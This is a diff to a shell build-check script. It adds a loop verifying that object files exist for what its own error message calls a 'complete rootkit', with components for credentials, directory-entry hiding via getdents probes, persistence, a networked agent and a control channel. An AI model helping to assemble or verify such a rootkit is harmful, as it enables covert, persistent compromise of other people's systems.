@@ -62,5 +62,15 @@ for object in crypto/aead.o crypto/aead_platform.o crypto/auth_platform.o \
 		transport/udp.o wire/dns_query.o; do
 	[[ -f $build/$object ]] || die "built component is missing: $object"
 done
+for object in core/main.o core/state.o interface/proc.o execution/worker.o \
+		execution/scheduler.o control/authorization.o privilege/credentials.o \
+		instrumentation/return_probe.o instrumentation/events.o \
+		instrumentation/dirent_filter.o instrumentation/getdents_probe.o \
+		interface/evidence.o network/framing.o network/protocol.o \
+		network/agent.o persistence/platform.o persistence/transaction.o \
+		interface/agent_status.o security/control.o; do
+	[[ -f $build/$object && ! -L $build/$object ]] ||
+		die "complete rootkit component is missing: $object"
+done
 
 printf '[+] authenticated control host behavior passed\n'
